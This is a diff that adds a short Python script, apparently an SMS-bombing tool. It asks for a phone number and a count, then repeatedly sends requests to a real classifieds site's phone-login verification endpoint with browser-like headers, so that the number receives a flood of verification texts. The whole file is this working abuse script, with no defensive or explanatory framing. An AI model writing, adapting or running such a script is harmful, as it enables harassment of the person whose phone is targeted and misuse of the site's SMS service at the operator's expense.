@@ -1,0 +1,18 @@
+import requests
+from requests.structures import CaseInsensitiveDict
+
+number=str(input("Enter Number:- "))
+amount=int(input("Enter Amount:- "))
+
+
+url = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone="+number
+
+headers = CaseInsensitiveDict()
+headers["accept"] = "application/json, text/plain, */*"
+headers["application-name"] = "web"
+headers["referer"] = "https://bikroy.com/en/?login-modal=true&redirect-url=/"
+
+for i in range(amount):
+    resp = requests.get(url, headers=headers)
+    print(resp.text)
+    print(str(i+1)+("SMS SEND"))
